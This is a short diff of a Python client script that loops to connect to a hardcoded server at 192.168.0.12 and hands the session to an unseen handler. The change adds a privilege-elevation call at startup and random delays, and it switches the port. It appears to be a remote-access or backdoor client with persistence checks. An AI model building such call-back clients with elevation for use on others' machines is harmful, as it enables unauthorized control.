@@ -1,10 +1,12 @@
 from core.connection import conn
 from core.connection.handler import connection_handler
-from core.utils import display_msg
+from core.utils import display_msg, elevate_script
 import os
 import sys
 import time
 import random
+
+
 
 
 def test_for_startup_app():
@@ -26,15 +28,18 @@ def test_for_startup_app():
         time.sleep(random_dur)
         return True
     else:
+        time.sleep(random.randint(1,10))
         return False
 
 
 if __name__ == "__main__":
+    elevate_script()
     while True:
         try:
+            
             test_for_startup_app()
             display_msg("Trying to connect ", "y")
-            client = conn.Client("192.168.0.12", 8080)
+            client = conn.Client("192.168.0.12", 8081)
             client.connect_with_server()
             connection_handler(client)
             client.close()
